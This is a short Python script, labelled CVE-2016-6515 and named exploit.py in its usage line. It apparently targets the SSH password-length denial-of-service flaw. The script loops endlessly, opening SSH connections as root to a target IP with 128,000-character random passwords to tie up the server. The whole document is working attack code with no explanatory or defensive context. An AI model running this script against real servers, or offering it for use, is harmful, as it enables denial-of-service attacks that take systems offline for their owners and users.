#CVE-2016-6515

import paramiko
from threading import Thread
import random
from string import ascii_lowercase
import sys
import logging

class SSHLoginThread(Thread):
    def __init__(self, tid, host, username):
        super().__init__()
        self.__tid = tid
        self.__host = host
        self.__username = username
        self.__password = "".join(random.choice(ascii_lowercase) for i in range(128000))
    
    def run(self):
        while True:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.__host, 22, username = self.__username, password = self.__password)
            except Exception as e:
                pass

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py <Target IP>")
        sys.exit(1)
    
    logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

    print("Starting threads...")
    
    for i in range(0, 256):
        thread = SSHLoginThread(i, sys.argv[1], "root")
        thread.start()
        thread.join()